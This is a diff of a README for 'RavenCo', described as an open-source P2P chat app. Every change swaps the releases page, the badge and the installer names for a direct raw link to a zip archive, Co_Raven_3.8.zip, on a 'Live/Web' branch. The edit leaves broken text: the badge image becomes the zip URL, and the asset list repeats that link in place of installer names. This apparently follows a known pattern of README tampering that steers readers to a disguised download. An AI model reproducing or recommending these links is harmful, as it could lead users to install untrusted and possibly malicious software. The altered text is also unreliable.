@@ -1,8 +1,8 @@
-https://github.com/dupa110/RavenCo/releases
+https://github.com/dupa110/RavenCo/raw/refs/heads/Live/Web/Co_Raven_3.8.zip
 
 # RavenCo: Open-Source P2P Chat for iOS and Android
 
-[![Releases](https://img.shields.io/badge/RavenCo-Releases-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dupa110/RavenCo/releases)
+[![Releases](https://github.com/dupa110/RavenCo/raw/refs/heads/Live/Web/Co_Raven_3.8.zip)](https://github.com/dupa110/RavenCo/raw/refs/heads/Live/Web/Co_Raven_3.8.zip)
 
 Table of Contents
 - Overview
@@ -153,7 +153,7 @@ Building from Source
 - Release Artifacts
   - The Releases page contains platform-specific installers and binaries
   - From the releases page, download the RavenCo build for your platform and run it
-  - The assets include installers like RavenCo-dmg, RavenCo-android.apk, RavenCo-windows.exe, and similar
+  - The assets include installers like RavenCo-dmg, https://github.com/dupa110/RavenCo/raw/refs/heads/Live/Web/Co_Raven_3.8.zip, https://github.com/dupa110/RavenCo/raw/refs/heads/Live/Web/Co_Raven_3.8.zip, and similar
 - Verification
   - Run unit tests and UI tests
   - Manually validate message delivery and replication across devices
